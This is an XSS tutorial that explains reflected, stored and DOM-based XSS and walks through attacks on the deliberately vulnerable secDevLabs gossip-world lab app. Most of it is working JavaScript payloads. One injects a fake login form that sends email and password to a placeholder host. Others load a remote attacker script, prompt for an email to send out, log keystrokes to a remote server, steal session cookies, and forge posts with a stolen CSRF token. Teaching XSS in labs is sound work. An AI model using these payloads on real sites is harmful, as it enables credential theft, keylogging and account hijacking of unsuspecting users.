An XSS (Cross-Site Scripting) vulnerability is a type of computer security vulnerability that allows an attacker to execute malicious code on a user's web page without the user's knowledge or consent. This vulnerability allows the attacker to steal personal information such as usernames, passwords and other sensitive data.

In essence, an XSS attack involves the insertion of malicious code into a vulnerable web page, which is then executed in the browser of the user accessing that page. The malicious code can be anything from scripts that redirect the user to another page, to scripts that log keystrokes or form data and send it to a remote server.

There are several types of XSS vulnerabilities, including the following:
- **Reflected**: This type of XSS occurs when data provided by the user is reflected in the HTTP response without being properly verified. This allows an attacker to inject malicious code into the response, which is then executed in the user's browser.
- **Stored**: This type of XSS occurs when an attacker is able to store malicious code in a database or on the web server hosting a vulnerable web page. This code is executed every time the page is loaded.
- **DOM-Based**: This type of XSS occurs when malicious code is executed in the user's browser through the DOM (Document Object Model). This occurs when JavaScript code on a web page modifies the DOM in a way that is vulnerable to malicious code injection.

XSS attacks can have serious consequences for businesses and individual users. For this reason, it is essential that web developers implement appropriate security measures to prevent XSS vulnerabilities. These measures can include validating input data, removing dangerous HTML code, and limiting JavaScript permissions in the user's browser.
# Example

----
> The example we are will be working on is: [secDevLabs](https://github.com/globocom/secDevLabs).
> For the installation we need to clone the .git repo and enter into secDevLabs > owasp-top10-2021-apps > a3 > gossip-world and run  **make install**.
> For the setup, we need to open a browser and visit **localhost:10007**, then create two users for testing.
----

We can test XSS typing the above code in new post:

```js
// This code will show a pop-up alert
<script>alert("XSS")</script>
```

We can also create a more complex html with a .js script, containing a form:

```js
<div id="formContainer"></div>

<script>
    var email;
    var password;
    var form = '<form>' +
        'Email: <input type="email" id="email" required>' +
        ' Contraseña: <input type="password" id="password" required>' +
        '<input type="button" onclick="submitForm()" value="Submit">' +
        '</form>';
  
    document.getElementById("formContainer").innerHTML = form;
  
    function submitForm() {
        email = document.getElementById("email").value;
        password = document.getElementById("password").value;
        fetch("http://{IP}/?email=" + email + "&password=" + password);
    }
</script>
```

----
> We can also run remote-stored scripts. Note that we don't need to put the 'script' label in the remote-accessed script, only in the web-uploaded one.
----

For running remote scripts we can serve a HTTP server with Python in our local machine and then access the wanted resource from the web:

```
python3 -m http.server 80
```

```js
<script src="http://{ATTACKER_IP}/test.js"></script>
```

Then, we can access remote source without the need of putting the 'script' label. For example, in the example below we will do an example about accessing a remote code that request an email and sent it to the Python HTTP server:

```js
var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");

if (email == null || email == "") {
	alert("Es necesario introducir un correo electrónico válido para visualizar el post");
} else {
	fetch("http://{IP}/?email=" + email);
}
```

Another example here about making a keylogger:

```js
<script>
    var k = "";
    
    document.onkeypress = function(e) {
        // e does not work in every browser, for that reason we add the 'or' condition
        e = e || window.event;

        k += e.key;
        var i = new Image();
        i.src = "http://{IP}/" + k;
    };
</script>
```

We can also make a redirect to another web:

```js
<script>
    window.location.href = "https://{DOMAIN}";
</script>
```

If we check that **HttpOnly** is false in the session cookie, we can perform a **Session Hijacking** stoling this session cookie:

```js
<script>
    var request = new XMLHttpRequest();
    request.open('GET', 'http://{IP}/?cookie=' + document.cookie);
    request.send();
</script>
```

Finally, we can try to publish posts on behalf oh another user. This will have two steps:

```js
// First step: we need to get the victim's csrf_token
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
// withCredentials is set as true because we want to avoid the generation of new credentials in the next request
req1.withCredentials = true;
req1.send();
  
var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

// Second step: We can check in BurpSuite how requests are handled (data sent, request type and request header) and send the data signed with the other user token
var req2 = new XMLHttpRequest();
var data = "title=Hacked%20Title&subtitle=Hacked%20Subtitle&text=Get%20Hacked!&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```